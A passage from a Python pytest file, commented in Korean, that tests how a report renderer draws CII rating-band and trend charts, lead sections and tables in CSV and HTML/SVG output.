        ),
    )


@dataclass(frozen=True)
class _UnknownSection:
    """아직 렌더러가 모르는 섹션 종류 — 새 종류를 더한 날의 모양이다."""

    title: str = "새 섹션"
    note: str | None = None
    rows: tuple = (("항목", "값"),)


def test_csv_fails_loudly_on_a_section_kind_it_does_not_know():
    """종전에는 ``else``가 없어 **제목만 쓰고 내용을 버렸다** — 예외도 없이 (`#2002`).

    검증(``validate``)을 건너뛰고 본문을 직접 불러, 분기 자체가 소진형인지 본다.
    """
    document = ReportDocument(title="t", slug="t", sections=[_UnknownSection()])  # type: ignore[list-item]
    with pytest.raises(AssertionError):
        "".join(_iter_csv_chunks(document))


def test_html_fails_loudly_on_a_section_kind_it_does_not_know():
    """HTML도 같다 — 종전에는 ``else``가 표를 떠맡아 새 종류를 표인 척 그리려 했다."""
    with pytest.raises(AssertionError):
        section_html(_UnknownSection())  # type: ignore[arg-type]


def test_document_validation_also_refuses_an_unknown_section_kind():
    """검증이 먼저 막는다 — 렌더러에 닿기 전이다."""
    document = ReportDocument(title="t", slug="t", sections=[_UnknownSection()])  # type: ignore[list-item]
    with pytest.raises(AssertionError):
        document.validate()


def test_a_chart_cannot_be_built_without_its_table():
    """`PRD §16.4` 「차트는 표 요약 제공」을 **타입이** 지킨다."""
    with pytest.raises(TypeError):
        ChartSection(chart="trend")  # type: ignore[call-arg]


def test_the_band_table_must_follow_the_declared_columns():
    """렌더러가 열을 자리로 읽는다 — 머리글이 어긋나면 다른 열의 값으로 밴드가 그려진다."""
    wrong = ChartSection(
        chart="rating_band",
        table=TableSection(title="등급 경계", headers=["등급", "상한"], rows=[["A", "86"]]),
    )
    with pytest.raises(ValueError, match="머리글"):
        render_html(_document(sections=[wrong]))


def test_the_band_rows_carry_the_grade_letters_in_order():
    """등급 문자는 **표가 싣는다** — 렌더러가 순서로 A~E를 붙이지 않는다."""
    band = _band()
    swapped = ChartSection(
        chart="rating_band",
        table=TableSection(
            title=band.title,
            headers=band.table.headers,
            rows=[band.table.rows[1], band.table.rows[0], *band.table.rows[2:]],
        ),
    )
    with pytest.raises(ValueError, match="A~E"):
        render_csv(_document(sections=[swapped]))


def test_a_trend_chart_needs_the_columns_it_draws():
    missing = ChartSection(
        chart="trend",
        table=TableSection(title="연도별 추이", headers=["연도", "등급"], rows=[["2026", "C"]]),
    )
    with pytest.raises(ValueError, match="실적 CII"):
        render_html(_document(sections=[missing]))


def test_csv_writes_the_chart_table_and_its_markers():
    """차트는 CSV에서 표현되지 않는다 — **품은 표와 표시값**이 그 내용이다 (`#2002` 완료 기준 ③)."""
    rows = list(csv.reader(io.StringIO(render_csv(_document(sections=[_band()])).lstrip(BOM))))
    assert list(BAND_HEADERS) in rows
    assert ["B", "86", "94", "6.013", "6.572"] in rows
    # 경계값은 수치 열 선언을 따라 접두 없이 나간다.
    assert ["E", "118", "—", "8.250", "—"] in rows
    assert ["올해 누적 실적 (기준 대비 %)", "102.3"] in rows


def test_html_keeps_the_table_under_the_chart():
    """차트가 있어도 표는 남는다 (`PRD §16.4`)."""
    html = render_html(_document(sections=[_band(), _trend()]))
    assert html.count('<svg class="chart"') == 2
    assert html.count("<table>") == 2
    assert "<td>B</td>" in html and "6.572" in html


def test_every_band_grade_is_drawn_with_its_pattern_and_its_letter():
    """흑백 인쇄에서 등급을 가르는 것은 **무늬와 문자**다 (`DESIGN_SYSTEM §14` · `§0.2` 제약 2)."""
    html = render_html(_document(sections=[_band()]))
    for grade in "ABCDE":
        assert f'fill="url(#grade0-{grade})"' in html, f"{grade} 구간에 무늬가 없다"
        assert re.search(rf'text-anchor="middle" fill="#1a1a18">{grade}</text>', html), grade


def test_band_patterns_follow_section_2_4_4():
    """`§2.4.4` 🔒 — A 없음(면) · B 45° · C 도트 · D 135° · E 크로스해치."""
    html = render_html(_document(sections=[_band()]))

    def pattern(grade: str) -> str:
        found = re.search(rf'<pattern id="grade0-{grade}"[^>]*>.*?</pattern>', html)
        assert found, grade
        return found.group(0)

    assert "<line" not in pattern("A") and "<circle" not in pattern("A")
    assert "rotate(45)" in pattern("B") and pattern("B").count("<line") == 1
    assert "<circle" in pattern("C")
    assert "rotate(135)" in pattern("D") and pattern("D").count("<line") == 1
    assert pattern("E").count("<line") == 2


def test_band_labels_its_edges_from_the_table():
    """눈금은 표의 「기준 대비 상한」을 그대로 적는다 — 렌더러가 경계를 만들지 않는다."""
    html = render_html(_document(sections=[_band()]))
    for edge in ["86", "94", "106", "118"]:
        assert f">{edge}%</text>" in html


def test_a_marker_beyond_the_axis_is_pinned_and_says_so():
    """축(74~175%) 밖의 위치는 끝에 붙이고 화살표로 알린다 — 값은 문구에 그대로."""
    html = render_html(_document(sections=[_band(markers=[("올해 누적", "190.0")])]))
    assert "올해 누적 190.0 ▶" in html
    html = render_html(_document(sections=[_band(markers=[("올해 누적", "60.0")])]))
    assert "◀ 올해 누적 60.0" in html


def test_band_without_this_year_draws_no_marker():
    """올해 실적이 없으면 위치 표시가 없다 — 없는 위치를 만들지 않는다."""
    with_marker = render_html(_document(sections=[_band()]))
    without = render_html(_document(sections=[_band(markers=[])]))
    assert "올해 누적 실적 (기준 대비 %) 102.3" in with_marker
    assert "올해 누적 실적" not in without
    # 위치 선은 밴드를 세로로 가로지르는 유일한 선이다
    assert with_marker.count("<line x1=") - without.count("<line x1=") == 1


def _band_rows(edges: list[str]) -> ChartSection:
    """경계 네 값(기준 대비 %)으로 밴드를 만든다. CII 칸은 이 검사와 무관해 비운다."""
    lows, highs = ["—", *edges], [*edges, "—"]
    return ChartSection(
        chart="rating_band",
        table=TableSection(
            title="등급 경계",
            headers=list(BAND_HEADERS),
            rows=[[g, lo, hi, "—", "—"] for g, lo, hi in zip("ABCDE", lows, highs, strict=True)],
        ),
    )


def _letter_positions(html: str) -> dict[str, float]:
    return {
        grade: float(x)
        for x, grade in re.findall(
            r'<text x="([\d.]+)" y="[\d.]+" text-anchor="middle" fill="#1a1a18">([A-E])</text>',
            html,
        )
    }


def test_a_narrow_first_grade_keeps_its_letter_outside_the_bar():
    """로로선 계열은 d1이 0.76이라 A가 축(74~175%)의 2%뿐이다 — 문자 바탕보다 좁다.

    축은 디자인 확정값이라 두고, 문자를 막대 **바깥**에 세워 잃지 않는다. 표에 있는 등급이
    그림에서 사라지면 「그 등급은 없다」로 읽힌다.
    """
    html = render_html(_document(sections=[_band_rows(["76", "89", "108", "127"])]))
    letters = _letter_positions(html)
    assert set(letters) == set("ABCDE")
    bar_start = float(re.search(r'<rect x="([\d.]+)" y="24.0"', html).group(1))
    assert letters["A"] < bar_start, "A 문자가 막대 안의 좁은 조각에 눌려 있다"
    assert 'fill="url(#grade0-A)"' in html, "좁아도 A 구간 자체는 그린다"


def test_a_grade_pushed_off_the_axis_still_shows_its_letter():
    """d1이 축 하한(74%)보다 작아도 A 문자는 남는다 — 예외 없이 사라지던 경로다."""
    html = render_html(_document(sections=[_band_rows(["66", "80", "100", "120"])]))
    assert set(_letter_positions(html)) == set("ABCDE")
    assert 'fill="url(#grade0-A)"' not in html, "축 밖 구간은 면이 없다 — 문자만 남는다"


def test_trend_letters_each_point_with_its_grade():
    """차트 선에는 무늬를 쓰지 않는다 — **마커 모양과 등급 문자**가 보조 채널이다 (`§2.4.4`)."""
    html = render_html(_document(sections=[_trend()]))
    svg = html[
        html.index('<svg class="chart"') : html.index("</svg>", html.index('<svg class="chart"'))
    ]
    assert svg.count("<circle") == 3 + 1  # 점 셋 + 범례 하나
    for grade in ["B", "C"]:
        assert f">{grade}</text>" in svg
    assert 'stroke-dasharray="4 3"' in svg, "기준 CII가 점선으로 갈리지 않는다"


def test_trend_breaks_the_line_where_a_year_is_missing():
    """없는 값을 이어 그리면 그 사이에 값이 있던 것처럼 읽힌다."""
    rows = [
        ["2023", "6.1", "7.3", "A"],
        ["2024", "6.4", "7.2", "B"],
        ["2025", "—", "—", "—"],
        ["2026", "7.1", "7.0", "C"],
        ["2027", "7.2", "6.9", "D"],
    ]
    html = render_html(_document(sections=[_trend(rows)]))
    # 실적·기준 각각 두 토막 → 넷
    assert html.count("<polyline") == 4


def test_trend_with_equal_values_draws_one_axis_label():
    """값이 전부 같으면 세로축 눈금을 같은 자리에 두 번 그리지 않는다."""
    rows = [["2024", "7.0", "7.0", "C"], ["2025", "7.0", "7.0", "C"]]
    html = render_html(_document(sections=[_trend(rows)]))
    assert html.count('text-anchor="end" fill="#5f5e5a">7.0</text>') == 1


def test_trend_with_nothing_to_draw_keeps_only_the_table():
    rows = [["2025", "—", "—", "—"]]
    html = render_html(_document(sections=[_trend(rows)]))
    assert '<svg class="chart"' not in html
    assert ">2025</td>" in html


def test_the_lead_is_declared_not_positional():
    """결론은 **선언**으로 가리킨다 — 위치로 짚으면 순서가 바뀌는 날 다른 값을 결론으로 인쇄한다."""
    section = KeyValueSection(
        title="2026년 누적 (YTD)",
        rows=[("실적 CII (attained)", "7.152"), ("기준 CII", "6.991"), ("예상 등급", "C")],
        lead=("예상 등급", "실적 CII (attained)"),
    )
    html = section_html(section)
    lead = re.search(r'<p class="lead">(.*?)</p>', html).group(1)
    # 선언한 순서대로 — 등급 다음 값
    assert lead.index("예상 등급") < lead.index("실적 CII (attained)")
    assert "<b>C</b>" in lead and "<b>7.152</b>" in lead
    # 결론 행은 표에서 빠지고 나머지만 남는다
    assert html.count("7.152") == 1
    assert '<td class="label">기준 CII</td>' in html


def test_a_section_without_a_lead_has_no_lead_block():
    assert 'class="lead"' not in render_html(_document())


def test_a_lead_pointing_at_a_missing_row_is_refused():
    section = KeyValueSection(title="YTD", rows=[("등급", "C")], lead=("실적 CII",))
    with pytest.raises(ValueError, match="결론"):
        render_html(_document(sections=[section]))


def test_a_lead_label_that_names_two_rows_is_refused():
    """같은 이름이 둘이면 PDF는 하나만 결론으로 세우고 CSV는 둘 다 내 두 포맷이 갈린다."""
    section = KeyValueSection(title="YTD", rows=[("등급", "C"), ("등급", "D")], lead=("등급",))
    with pytest.raises(ValueError, match="여러 행"):
        render_csv(_document(sections=[section]))


def test_csv_keeps_every_row_regardless_of_the_lead():
    """결론 선언은 표현이다 — CSV는 행을 전부 그대로 낸다."""
    section = KeyValueSection(
        title="YTD", rows=[("등급", "C"), ("실적 CII", "7.152")], lead=("등급",)
    )
    rows = list(csv.reader(io.StringIO(render_csv(_document(sections=[section])).lstrip(BOM))))
    assert ["등급", "C"] in rows and ["실적 CII", "7.152"] in rows


def test_charts_stay_inside_the_report_palette():
    """차트도 닫힌 집합 안이다 — 등급 색을 쓰지 않고 **무늬와 문자**로 가른다 (`§14`)."""
    rendered = render_html(_document(sections=[_band(), _trend()]))
    allowed = NEUTRAL_INK | {BRAND_NAVY.upper()} | _hexes(LOGO_ASSET.read_text(encoding="utf-8"))
    assert _hexes(rendered) - allowed == set()


def test_charts_fetch_nothing_from_outside_the_document():
    """무늬는 ``url(#…)`` 문서 조각으로만 참조한다 — 렌더링이 네트워크를 타지 않는다."""
    rendered = render_html(_document(sections=[_band(), _trend()]))
    body = rendered.replace(LOGO_SVG, "")
    assert not re.findall(r"url\(\s*(?!#)[^)]*\)", body)
    assert "href=" not in body and "src=" not in body


def test_chart_axis_labels_use_the_caption_size():
    """`DESIGN_SYSTEM §3` caption(12) · `§9.1` 🔒 — viewBox가 본문 폭에 맞아 SVG 12가 12px다."""
    html = render_html(_document(sections=[_band(), _trend()]))
    assert html.count('font-size="12"') == 2
    assert html.count('viewBox="0 0 672 ') == 2


def test_pattern_ids_do_not_collide_between_charts():
    html = render_html(_document(sections=[_band(), _band()]))
    ids = re.findall(r'<pattern id="([^"]+)"', html)
    assert len(ids) == len(set(ids)) == 10
